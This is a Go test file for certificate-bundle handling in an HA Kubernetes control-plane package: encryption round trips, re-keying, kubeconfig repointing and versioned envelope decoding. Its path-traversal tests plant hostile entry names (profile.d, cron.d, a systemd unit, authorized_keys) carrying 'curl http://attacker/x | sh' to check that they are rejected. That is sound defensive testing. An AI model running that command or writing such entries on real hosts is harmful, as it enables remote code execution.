package ha

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"maps"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"go.etcd.io/etcd/api/v3/etcdserverpb"
	clientv3 "go.etcd.io/etcd/client/v3"
	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"

	"github.com/ctrliq/stratum/internal/host"
	"github.com/ctrliq/stratum/internal/profile"
	"github.com/ctrliq/stratum/internal/version"
)

func mustKey(t *testing.T) string {
	t.Helper()
	k, err := NewCertKey()
	if err != nil {
		t.Fatalf("NewCertKey: %v", err)
	}
	return k
}

func TestNewCertKey(t *testing.T) {
	k := mustKey(t)
	if len(k) != 64 { // 32 bytes hex-encoded
		t.Errorf("NewCertKey len = %d, want 64 hex chars", len(k))
	}
	if k == mustKey(t) {
		t.Error("NewCertKey returned the same key twice")
	}
	if _, err := aesgcm(k); err != nil {
		t.Errorf("NewCertKey produced a key aesgcm rejects: %v", err)
	}
}

func TestAESGCMBadKey(t *testing.T) {
	for _, bad := range []string{"", "tooshort", "zz"} {
		if _, err := aesgcm(bad); err == nil {
			t.Errorf("aesgcm(%q) accepted an invalid key", bad)
		}
	}
}

func TestEncryptDecryptRoundTrip(t *testing.T) {
	key := mustKey(t)
	plaintext := []byte("shared ca + sa keypair bytes")

	ct, err := encrypt(key, plaintext)
	if err != nil {
		t.Fatal(err)
	}
	if bytes.Equal(ct, plaintext) {
		t.Error("ciphertext equals plaintext")
	}

	got, err := decrypt(key, ct)
	if err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(got, plaintext) {
		t.Errorf("round trip = %q, want %q", got, plaintext)
	}
}

func TestDecryptWrongKeyFails(t *testing.T) {
	ct, err := encrypt(mustKey(t), []byte("secret"))
	if err != nil {
		t.Fatal(err)
	}
	if _, err := decrypt(mustKey(t), ct); err == nil {
		t.Error("decrypt with the wrong certificate-key succeeded")
	}
}

func TestDecryptShortCiphertext(t *testing.T) {
	if _, err := decrypt(mustKey(t), []byte{0x01}); err == nil {
		t.Error("decrypt accepted a too-short ciphertext")
	}
}

// TestRekeyInvalidatesOldKey is the property that makes an on-demand
// re-key worth doing: after the shared material is re-encrypted under a fresh
// certificate-key, the previous key — which on an older build was printed to
// stdout and may sit in a CI log — no longer decrypts it, while the new key does.
// This is exactly what `certs rotate --rekey-shared` does to the stratum-certs
// ciphertext (NewCertKey + ReUploadCerts).
func TestRekeyInvalidatesOldKey(t *testing.T) {
	plaintext := []byte("shared ca + sa keypair bytes")
	oldKey, newKey := mustKey(t), mustKey(t)
	if oldKey == newKey {
		t.Fatal("precondition: the two keys must differ")
	}
	// The re-key re-encrypts the same material under the new key.
	newCT, err := encrypt(newKey, plaintext)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := decrypt(oldKey, newCT); err == nil {
		t.Error("the OLD certificate-key still decrypts the re-keyed material — the re-key did not invalidate it")
	}
	got, err := decrypt(newKey, newCT)
	if err != nil || !bytes.Equal(got, plaintext) {
		t.Errorf("the NEW certificate-key must decrypt the re-keyed material: got=%q err=%v", got, err)
	}
}

func TestRepointKubeconfigs(t *testing.T) {
	const vip = "https://192.168.99.240:6443"
	dir := t.TempDir()
	oldDir, oldAdmin, oldBoot := version.KubeconfigDir, version.AdminConf, version.BootstrapKubeconfig
	t.Cleanup(func() {
		version.KubeconfigDir, version.AdminConf, version.BootstrapKubeconfig = oldDir, oldAdmin, oldBoot
	})
	version.KubeconfigDir = dir
	version.AdminConf = filepath.Join(dir, "admin.conf")
	version.BootstrapKubeconfig = filepath.Join(dir, "bootstrap.conf")
	in := strings.Join([]string{
		"apiVersion: v1",
		"kind: Config",
		"clusters:",
		"- cluster:",
		"    certificate-authority-data: QUFBQQ==",
		"    server: https://10.0.0.5:6443",
		"  name: stratum",
		"contexts:",
		"- context: {cluster: stratum, user: admin}",
		"  name: stratum",
		"current-context: stratum",
		"users:",
		"- name: admin",
		"  user: {}",
	}, "\n")
	if err := os.WriteFile(version.AdminConf, []byte(in), 0o600); err != nil {
		t.Fatal(err)
	}
	schedulers := []string{version.SchedulerKubeconfig(), filepath.Join(dir, "scheduler.kubeconfig")}
	for _, f := range schedulers {
		if err := os.MkdirAll(filepath.Dir(f), 0o700); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(f, []byte(in), 0o600); err != nil {
			t.Fatal(err)
		}
	}

	if err := RepointKubeconfigs(vip); err != nil {
		t.Fatal(err)
	}
	for _, f := range schedulers {
		if b, err := os.ReadFile(f); err != nil || !strings.Contains(string(b), "server: "+vip) {
			t.Errorf("%s not repointed to the VIP (err %v)", f, err)
		}
	}
	out, err := os.ReadFile(version.AdminConf)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(out), "https://10.0.0.5:6443") {
		t.Error("original server endpoint not replaced")
	}
	if !strings.Contains(string(out), "server: "+vip) {
		t.Errorf("VIP endpoint missing:\n%s", out)
	}
	// credentials must survive untouched
	if !strings.Contains(string(out), "QUFBQQ==") {
		t.Error("repoint dropped the embedded CA")
	}
}

// --- shared-cert blob containment ---

// uploadSet is what UploadCerts produces: the mandatory shared certs plus any
// optional rotation material that happened to be on disk.
func uploadSet(t *testing.T) map[string][]byte {
	t.Helper()
	files := map[string][]byte{}
	for _, n := range sharedCerts {
		files[n] = []byte("content of " + n)
	}
	for _, n := range rotationCerts {
		files[n] = []byte("content of " + n)
	}
	for _, n := range profile.SharedSecretNames() {
		files[n] = []byte("content of " + n)
	}
	return files
}

// TestCertAllowlistCoversUploadSet pins the download allowlist to the upload
// lists. If someone adds a name to sharedCerts or rotationCerts but the
// allowlist stops deriving from them, joins break at runtime — this fails first.
func TestCertAllowlistCoversUploadSet(t *testing.T) {
	for _, n := range append(append([]string{}, sharedCerts...), rotationCerts...) {
		if _, ok := certAllowlist[n]; !ok {
			t.Errorf("UploadCerts writes %q but the download allowlist rejects it", n)
		}
	}
	if got, want := len(certAllowlist), len(sharedCerts)+len(rotationCerts); got != want {
		t.Errorf("allowlist has %d entries, upload lists have %d — duplicate or stale entry", got, want)
	}
}

// TestSharedCertSetsAreTheJoinContract pins the bundle's entry names, in
// order. These names are a contract across versions, not an implementation
// detail: an older joiner refuses any entry it does not know (checkCertNames),
// so renaming or dropping one here breaks joining an upgraded cluster with an
// older binary. TestCertAllowlistCoversUploadSet proves the allowlist tracks
// these two lists; it cannot see a change to their contents.
func TestSharedCertSetsAreTheJoinContract(t *testing.T) {
	wantShared := []string{
		"ca.crt", "ca.key", "sa.key", "sa.pub",
		"front-proxy-ca.crt", "front-proxy-ca.key",
		"front-proxy-client.crt", "front-proxy-client.key",
		"etcd-ca.crt", "etcd-ca.key",
	}
	if !slices.Equal(sharedCerts, wantShared) {
		t.Errorf("sharedCerts = %q\nwant %q — an older joiner refuses a bundle entry it does not know, so these names are a cross-version contract", sharedCerts, wantShared)
	}
	wantRotation := []string{
		"ca-bundle.crt", "front-proxy-ca-bundle.crt", "sa-bundle.pub",
		"etcd-ca-bundle.crt",
		"kubelet-client-ca-bundle.crt", "kubelet-client-ca.crt", "kubelet-client-ca.key",
		"kubelet-client-ca-new.crt", "kubelet-client-ca-new.key",
		"ca-new.crt", "ca-new.key", "front-proxy-ca-new.crt", "front-proxy-ca-new.key",
		"sa-new.key", "sa-new.pub",
		"netconfig",
		"cilium.json",
	}
	if !slices.Equal(rotationCerts, wantRotation) {
		t.Errorf("rotationCerts = %q\nwant %q — an older joiner refuses a bundle entry it does not know, so these names are a cross-version contract", rotationCerts, wantRotation)
	}
	// The cis profile's shared secret is the entry an earlier binary carried
	// the at-rest key in, by that name.
	if got, want := profile.SharedSecretNames(), []string{"encryption-config.yaml"}; !slices.Equal(got, want) {
		t.Errorf("the registered profiles' shared secrets = %q\nwant %q — the same cross-version contract", got, want)
	}
}

func TestWriteCertFilesAcceptsTheUploadSet(t *testing.T) {
	dir := filepath.Join(t.TempDir(), "pki")
	files := uploadSet(t)

	if err := writeCertFiles(dir, files); err != nil {
		t.Fatalf("writeCertFiles rejected a legitimate bundle: %v", err)
	}

	for name, want := range files {
		got, err := os.ReadFile(filepath.Join(dir, name))
		if err != nil {
			t.Errorf("%s: %v", name, err)
			continue
		}
		if !bytes.Equal(got, want) {
			t.Errorf("%s = %q, want %q", name, got, want)
		}
		fi, err := os.Stat(filepath.Join(dir, name))
		if err != nil {
			t.Fatal(err)
		}
		// The property that matters is that private key material is not readable
		// by group or other. Asserting an exact 0644 would be umask-dependent.
		secret := filepath.Ext(name) == ".key" || name == "encryption-config.yaml"
		if secret && fi.Mode().Perm()&0o077 != 0 {
			t.Errorf("%s has mode %04o — key material is group/world readable", name, fi.Mode().Perm())
		}
	}
}

// TestWriteCertFilesReplacesEntriesWithoutTruncating: a CA rotation rewrites
// the key file of a control plane that already holds the cluster's live key.
// The old file must stay whole until the new one replaces it.
func TestWriteCertFilesReplacesEntriesWithoutTruncating(t *testing.T) {
	dir := t.TempDir()
	key := filepath.Join(dir, encryptionConfigEntry)
	if err := os.WriteFile(key, []byte("the live key"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(key, 0o644); err != nil {
		t.Fatal(err)
	}
	old, err := os.Open(key)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { old.Close() })
	files := uploadSet(t)
	files[encryptionConfigEntry] = []byte("the bundle's key")

	if err := writeCertFiles(dir, files); err != nil {
		t.Fatal(err)
	}
	if b, _ := io.ReadAll(old); string(b) != "the live key" {
		t.Errorf("%s was rewritten in place: the file it replaced now holds %q", key, b)
	}
	if b, _ := os.ReadFile(key); string(b) != "the bundle's key" {
		t.Errorf("%s = %q, want the bundle's key", key, b)
	}
	fi, err := os.Stat(key)
	if err != nil {
		t.Fatal(err)
	}
	if got := fi.Mode().Perm(); got != 0o600 {
		t.Errorf("%s: mode %v, want 0600 even over an existing 0644 file", key, got)
	}
	entries, _ := os.ReadDir(dir)
	for _, e := range entries {
		if _, ok := files[e.Name()]; !ok {
			t.Errorf("the write left %s behind", e.Name())
		}
	}
}

// TestWriteCertFilesReportsAPartlyAppliedBundle: entries are written in name
// order, so a write that fails part-way leaves a known prefix of the bundle
// replaced, and the error names it. An entry whose rename landed before its
// directory sync failed counts as replaced, and when that is the last entry the
// error says the whole bundle is in place.
func TestWriteCertFilesReportsAPartlyAppliedBundle(t *testing.T) {
	saved := writeCertFile
	t.Cleanup(func() { writeCertFile = saved })
	boom := errors.New("ENOSPC")
	files := uploadSet(t)
	files[encryptionConfigEntry] = []byte("the bundle's key")
	names := slices.Sorted(maps.Keys(files))

	cases := []struct {
		failing   string
		afterSync bool
	}{{names[0], false}, {encryptionConfigEntry, false}, {names[0], true}, {encryptionConfigEntry, true},
		{names[len(names)-1], true}}
	for _, c := range cases {
		failing := c.failing
		dir := t.TempDir()
		writeCertFile = func(path string, b []byte, perm os.FileMode) error {
			if filepath.Base(path) != failing {
				return saved(path, b, perm)
			}
			if !c.afterSync {
				return boom
			}
			if err := saved(path, b, perm); err != nil {
				return err
			}
			return fmt.Errorf("%w: %w", host.ErrNotDurable, boom)
		}
		err := writeCertFiles(dir, files)
		if !errors.Is(err, boom) {
			t.Fatalf("failing %s: err = %v, want the failed write's error", failing, err)
		}
		at := slices.Index(names, failing)
		if c.afterSync {
			at++
		}
		if at == 0 && !strings.Contains(err.Error(), "no entry was replaced") {
			t.Errorf("failing the first entry: %v, want it to say nothing was replaced", err)
		}
		whole := at == len(names)
		if whole && (!strings.Contains(err.Error(), "every entry was replaced") || strings.Contains(err.Error(), "part of the bundle")) {
			t.Errorf("failing the last entry after its rename: %v, want it to say every entry is in place", err)
		}
		if at > 0 && !whole && !errors.Is(err, errPartBundle) {
			t.Errorf("failing %s: %v, want it to match errPartBundle", failing, err)
		}
		if (at == 0 || whole) && errors.Is(err, errPartBundle) {
			t.Errorf("failing %s: %v matches errPartBundle, but the bundle is all old or all new", failing, err)
		}
		if strings.Contains(err.Error(), "re-run") {
			t.Errorf("failing %s: %v, want no recovery advice: the right next step depends on the caller", failing, err)
		}
		for i, name := range names {
			_, statErr := os.Stat(filepath.Join(dir, name))
			switch {
			case i < at && (statErr != nil || (!whole && !strings.Contains(err.Error(), name))):
				t.Errorf("failing %s: %s was written first, but is missing (%v) or unnamed in: %v", failing, name, statErr, err)
			case i >= at && statErr == nil:
				t.Errorf("failing %s: %s, after it in name order, was written", failing, name)
			}
		}
	}
}

// TestWriteCertFilesRejectsPathTraversal is the regression test for shared-cert
// blob containment. Each vector is a bundle that decrypts and unmarshals
// cleanly — AES-GCM proves only that it was sealed with the certificate-key —
// but carries one entry that would escape the PKI directory.
func TestWriteCertFilesRejectsPathTraversal(t *testing.T) {
	vectors := []struct {
		name  string
		entry string
	}{
		{"profile.d drop", "../../profile.d/stratum.sh"},
		{"cron.d drop", "../../cron.d/x"},
		{"systemd unit overwrite", "../../systemd/system/stratum-kubelet.service"},
		{"absolute path", "/etc/profile.d/stratum.sh"},
		{"subdirectory", "sub/ca.crt"},
		{"parent", ".."},
		{"dot", "."},
		{"trailing-slash traversal", "../../profile.d/"},
		{"unexpected but contained name", "authorized_keys"},
	}

	for _, v := range vectors {
		t.Run(v.name, func(t *testing.T) {
			root := t.TempDir()
			pki := filepath.Join(root, "etc", "stratum", "pki")
			escape := filepath.Join(root, "etc", "profile.d")
			if err := os.MkdirAll(escape, 0o755); err != nil {
				t.Fatal(err)
			}
			// Control: prove the escape target is genuinely writable here, so a
			// passing test is the guard working and not a missing directory.
			probe := filepath.Join(escape, "probe")
			if err := os.WriteFile(probe, []byte("x"), 0o644); err != nil {
				t.Fatalf("escape target not writable, test would pass vacuously: %v", err)
			}
			if err := os.Remove(probe); err != nil {
				t.Fatal(err)
			}

			// A full, legitimate bundle plus the one hostile entry.
			files := uploadSet(t)
			files[v.entry] = []byte("curl http://attacker/x | sh")

			err := writeCertFiles(pki, files)
			if err == nil {
				t.Fatalf("writeCertFiles accepted an entry named %q", v.entry)
			}
			if !strings.Contains(err.Error(), v.entry) {
				t.Errorf("error does not name the offending entry %q: %v", v.entry, err)
			}

			// Nothing at all may have been written: not the hostile entry, and not
			// the legitimate entries that share the blob with it.
			if _, statErr := os.Stat(filepath.Join(escape, "stratum.sh")); statErr == nil {
				t.Error("hostile entry escaped the PKI directory")
			}
			if entries, readErr := os.ReadDir(pki); readErr == nil && len(entries) > 0 {
				t.Errorf("a rejected bundle wrote %d file(s) into the PKI dir", len(entries))
			}
		})
	}
}

// TestWriteCertFilesRejectionIsDeterministic guards the two-pass design: with
// several bad entries the message must be stable across runs, not whichever key
// Go's randomised map iteration reached first.
func TestWriteCertFilesRejectionIsDeterministic(t *testing.T) {
	files := uploadSet(t)
	for _, bad := range []string{"../../cron.d/x", "../../profile.d/y", "authorized_keys"} {
		files[bad] = []byte("x")
	}

	var first string
	for i := 0; i < 20; i++ {
		dir := filepath.Join(t.TempDir(), "pki")
		err := writeCertFiles(dir, files)
		if err == nil {
			t.Fatal("accepted a bundle with three unexpected entries")
		}
		// Strip the per-run temp dir so the comparison is about entry ORDER,
		// which is what the two-pass design pins.
		msg := strings.ReplaceAll(err.Error(), dir, "<dir>")
		if i == 0 {
			first = msg
			continue
		}
		if msg != first {
			t.Fatalf("error message varies across runs:\n  %s\n  %s", first, msg)
		}
	}
	for _, bad := range []string{"../../cron.d/x", "../../profile.d/y", "authorized_keys"} {
		if !strings.Contains(first, bad) {
			t.Errorf("message omits offending entry %q: %s", bad, first)
		}
	}
}

func TestInitialClusterNamesTheUnstartedMember(t *testing.T) {
	ms := []*etcdserverpb.Member{
		{Name: "cp1", PeerURLs: []string{"https://10.0.0.1:2380"}},
		{PeerURLs: []string{"https://10.0.0.2:2380"}},
	}
	if got, want := initialCluster(ms, "cp2"), "cp1=https://10.0.0.1:2380,cp2=https://10.0.0.2:2380"; got != want {
		t.Fatalf("initialCluster = %q, want %q", got, want)
	}
}

// --- the versioned bundle envelope ---
//
// Each grant entry's payload carries one versioned envelope (v1): version,
// authenticated metadata, files. The metadata — the publication's generation,
// whether the bundle carries the at-rest key, the cluster VIP the publishing
// control plane recorded, and the etcd client endpoints — travels INSIDE the
// ciphertext, so the facts a joiner reads from it are authenticated by the
// same AES-GCM open that authenticates the files. The legacy flat map stays a
// supported decode shape (the pre-envelope payload the legacy `certs` entry
// keeps published for the negotiated transition), and the strict file
// allowlist governs the envelope's files exactly as it governed the flat
// map's. This is the envelope's decode half at the unit level; the publication
// side is pinned by TestUploadPublishesTheVersionedEnvelope and the join side
// by TestControlPlaneJoinTakesTheAuthenticatedVIPMetadata.
func TestBundleMetadataSectionAndFlatForm(t *testing.T) {
	files := uploadSet(t)
	delete(files, encryptionConfigEntry) // a keyless bundle: the metadata must report none, not invent a key

	t.Run("the v1 envelope decodes with its authenticated metadata", func(t *testing.T) {
		env := envelopeShape{Version: bundleEnvelopeVersion}
		env.Metadata.Generation = 3
		env.Metadata.EtcdEndpoints = []string{"10.0.0.11", "10.0.0.12"}
		env.Metadata.VIP = "10.0.0.10"
		env.Files = files
		plain, err := json.Marshal(env)
		if err != nil {
			t.Fatal(err)
		}
		got, md, enveloped, err := decodeGrantPayload(plain)
		if err != nil {
			t.Fatalf("decodeGrantPayload: %v", err)
		}
		if !enveloped {
			t.Fatal("the v1 envelope decoded as the legacy flat map: its metadata is not authenticated metadata")
		}
		uploadedFilesMatch(t, got, files)
		if md.Generation != 3 || md.VIP != "10.0.0.10" || md.CarriesAtRestKey {
			t.Errorf("metadata = generation %d VIP %q carriedKey %v, want generation 3, VIP 10.0.0.10, no at-rest key",
				md.Generation, md.VIP, md.CarriesAtRestKey)
		}
		if want := []string{"10.0.0.11", "10.0.0.12"}; !slices.Equal(md.EtcdEndpoints, want) {
			t.Errorf("metadata etcd endpoints = %q, want %q — the addresses a joiner dials", md.EtcdEndpoints, want)
		}
	})

	t.Run("the legacy flat map decodes as the flat form", func(t *testing.T) {
		plain, err := json.Marshal(files)
		if err != nil {
			t.Fatal(err)
		}
		got, md, enveloped, err := decodeGrantPayload(plain)
		if err != nil {
			t.Fatalf("decodeGrantPayload: %v", err)
		}
		if enveloped {
			t.Fatal("the legacy flat map decoded as an envelope")
		}
		uploadedFilesMatch(t, got, files)
		if md.Generation != 0 || md.VIP != "" || md.CarriesAtRestKey || len(md.EtcdEndpoints) != 0 {
			t.Errorf("a legacy flat map invented metadata %+v, want none", md)
		}
	})

	t.Run("an unsupported envelope version is refused", func(t *testing.T) {
		env := envelopeShape{Version: bundleEnvelopeVersion + 1}
		env.Metadata.EtcdEndpoints = []string{"10.0.0.11"}
		env.Files = files
		plain, err := json.Marshal(env)
		if err != nil {
			t.Fatal(err)
		}
		if _, _, _, err := decodeGrantPayload(plain); err == nil {
			t.Fatal("decodeGrantPayload decoded a future envelope version as if it were v1")
		}
	})

	t.Run("unknown entries are refused inside the envelope too", func(t *testing.T) {
		env := envelopeShape{Version: bundleEnvelopeVersion}
		env.Files = maps.Clone(files)
		env.Files["authorized_keys"] = []byte("curl http://attacker/x | sh")
		plain, err := json.Marshal(env)
		if err != nil {
			t.Fatal(err)
		}
		got, _, _, err := decodeGrantPayload(plain)
		if err != nil {
			t.Fatalf("decodeGrantPayload: %v", err)
		}
		dir := filepath.Join(t.TempDir(), "pki")
		if err := writeCertFiles(dir, got); err == nil || !strings.Contains(err.Error(), "authorized_keys") {
			t.Fatalf("writeCertFiles = %v, want a refusal naming the envelope's unknown entry", err)
		}
		if entries, readErr := os.ReadDir(dir); readErr == nil && len(entries) > 0 {
			t.Errorf("a rejected envelope wrote %d file(s) into the PKI dir", len(entries))
		}
	})

	t.Run("the legacy decoder is what publication negotiates against", func(t *testing.T) {
		// The negotiated transition: publication keeps a shape every supported
		// joiner version decodes. Driven with this package's own legacy decoder
		// — writeCertFiles, the decode a released stratum runs — the flat-map
		// payload still applies, and the envelope payload is refused by it,
		// which is why the legacy `certs` entry stays published beside the
		// grant entries rather than the other way round.
		flatPlain, err := json.Marshal(files)
		if err != nil {
			t.Fatal(err)
		}
		got, _, enveloped, err := decodeGrantPayload(flatPlain)
		if err != nil || enveloped {
			t.Fatalf("decodeGrantPayload = (%v, enveloped %v), want the flat form", err, enveloped)
		}
		if err := writeCertFiles(filepath.Join(t.TempDir(), "pki"), got); err != nil {
			t.Fatalf("the legacy decoder refused the flat-map payload an older joiner must still decode: %v", err)
		}
		env := envelopeShape{Version: bundleEnvelopeVersion}
		env.Files = files
		envPlain, err := json.Marshal(env)
		if err != nil {
			t.Fatal(err)
		}
		var asFlat map[string][]byte
		if err := json.Unmarshal(envPlain, &asFlat); err == nil {
			t.Fatal("the envelope payload decoded as the legacy flat map: publication could not keep the two shapes apart")
		}
	})

	t.Run("a new joiner reads the metadata, never the annotation", func(t *testing.T) {
		orig := version.PKIDir
		version.PKIDir = t.TempDir()
		t.Cleanup(func() { version.PKIDir = orig })
		key := mustKey(t)
		env := envelopeShape{Version: bundleEnvelopeVersion}
		env.Metadata.Generation = 7
		env.Metadata.EtcdEndpoints = []string{"10.0.0.11"}
		env.Metadata.VIP = "10.0.0.10"
		env.Files = files
		sec := &corev1.Secret{
			ObjectMeta: metav1.ObjectMeta{Name: certsSecret, Namespace: "kube-system",
				// The annotation deliberately disagrees: the unauthenticated hint
				// must never pass for the authenticated metadata.
				Annotations: map[string]string{etcdEndpointsAnnotation: "192.0.2.99"}},
			Data: map[string][]byte{grantEntryKey("abc123"): sealedEnvelope(t, key, env)},
		}
		plain, err := decrypt(key, sec.Data[grantEntryKey("abc123")])
		if err != nil {
			t.Fatal(err)
		}
		g, err := openGrant(sec, plain, nil)
		if err != nil {
			t.Fatalf("openGrant: %v", err)
		}
		if !slices.Equal(g.Published, []string{"10.0.0.11"}) {
			t.Errorf("grant etcd endpoints = %v, want the envelope's authenticated [10.0.0.11], not the annotation's 192.0.2.99", g.Published)
		}
		if g.VIP != "10.0.0.10" || g.Generation != 7 || g.CarriedKey {
			t.Errorf("grant = VIP %q generation %d carriedKey %v, want the metadata's 10.0.0.10, 7, false", g.VIP, g.Generation, g.CarriedKey)
		}
	})
}

// fakeLister answers MemberList the way etcd does without quorum: a
// linearizable read fails, a serializable one is served from the local copy.
type fakeLister struct{ members int }

func (f fakeLister) MemberList(_ context.Context, opts ...clientv3.OpOption) (*clientv3.MemberListResponse, error) {
	if !clientv3.OpGet("", opts...).IsSerializable() {
		return nil, errors.New("etcdserver: request timed out")
	}
	return &clientv3.MemberListResponse{Members: make([]*etcdserverpb.Member, f.members)}, nil
}

// TestCountMembersWorksWithoutQuorum: the seed counts its own
// etcd's members to notice HA growth. If a second member joined and then went
// away before the first poll, the seed has lost quorum, a linearizable list
// fails, and the growth would never be recorded. Fails if the member count
// demands a linearizable read.
func TestCountMembersWorksWithoutQuorum(t *testing.T) {
	n, err := countMembers(t.Context(), fakeLister{members: 2})
	if err != nil || n != 2 {
		t.Fatalf("countMembers = %d, %v; want 2 from the local, serializable view", n, err)
	}
}

// A join's check sees the bundle's profile and the shared secrets it carries
// before any file is written, so a mismatch it refuses leaves this node's PKI
// as it was. A legacy flat map, or an envelope an earlier stratum published,
// names no profile, which leaves the check to the secrets alone.
func TestOpenGrantChecksTheProfileBeforeWritingTheBundle(t *testing.T) {
	files := uploadSet(t)
	key := mustKey(t)
	seal := func(prof *string) (*corev1.Secret, []byte) {
		env := envelopeShape{Version: bundleEnvelopeVersion}
		env.Metadata.Profile = prof
		env.Files = files
		sec := &corev1.Secret{
			ObjectMeta: metav1.ObjectMeta{Name: certsSecret, Namespace: "kube-system"},
			Data:       map[string][]byte{grantEntryKey("abc123"): sealedEnvelope(t, key, env)},
		}
		plain, err := decrypt(key, sec.Data[grantEntryKey("abc123")])
		if err != nil {
			t.Fatal(err)
		}
		return sec, plain
	}
	pkiDir := func(t *testing.T) string {
		t.Helper()
		orig := version.PKIDir
		version.PKIDir = filepath.Join(t.TempDir(), "pki")
		t.Cleanup(func() { version.PKIDir = orig })
		return version.PKIDir
	}

	t.Run("a refused profile writes nothing", func(t *testing.T) {
		dir := pkiDir(t)
		sec, plain := seal(ptrTo("cis"))
		var seen bundleProfile
		refused := errors.New("refused")
		_, err := openGrant(sec, plain, func(b bundleProfile) error { seen = b; return refused })
		if !errors.Is(err, refused) {
			t.Fatalf("openGrant = %v, want the check's refusal", err)
		}
		if !seen.ProfileKnown || seen.Profile != "cis" || !slices.Equal(seen.Secrets, []string{encryptionConfigEntry}) {
			t.Errorf("the check saw %+v, want the cis profile carrying %s", seen, encryptionConfigEntry)
		}
		if entries, err := os.ReadDir(dir); err == nil && len(entries) > 0 {
			t.Errorf("a refused bundle wrote %d entries into %s", len(entries), dir)
		}
	})

	t.Run("an accepted bundle is written and carries the profile", func(t *testing.T) {
		dir := pkiDir(t)
		sec, plain := seal(ptrTo(""))
		g, err := openGrant(sec, plain, func(bundleProfile) error { return nil })
		if err != nil {
			t.Fatal(err)
		}
		if !g.ProfileKnown || g.Profile != "" {
			t.Errorf("grant profile = %q known %v, want no profile, known", g.Profile, g.ProfileKnown)
		}
		if _, err := os.Stat(filepath.Join(dir, encryptionConfigEntry)); err != nil {
			t.Errorf("the accepted bundle's %s was not written: %v", encryptionConfigEntry, err)
		}
	})

	t.Run("an envelope without a profile leaves it unknown", func(t *testing.T) {
		pkiDir(t)
		sec, plain := seal(nil)
		g, err := openGrant(sec, plain, nil)
		if err != nil || g.ProfileKnown {
			t.Fatalf("openGrant = %+v, %v; want the profile unknown", g.bundleProfile, err)
		}
	})
}

// Every entry the join bundle shares that is not a certificate or key is a
// name profile.Validate refuses for a shared secret, so a profile cannot
// declare one the engine writes on its own, and "version" in any case is
// refused because the legacy flat map is probed for it.
func TestEngineBundleNamesAreReservedFromProfileSecrets(t *testing.T) {
	certExt := map[string]bool{".crt": true, ".key": true, ".pub": true, ".csr": true, ".pem": true}
	for name := range certAllowlist {
		if certExt[filepath.Ext(name)] {
			continue
		}
		if !profile.ReservedSecretName(name) {
			t.Errorf("bundle entry %q is not reserved: a profile secret could take its name", name)
		}
	}
	for _, n := range []string{"version", "Version", "VERSION"} {
		if !profile.ReservedSecretName(n) {
			t.Errorf("%q is not reserved, but the flat-map probe decodes it as the envelope version", n)
		}
	}
}
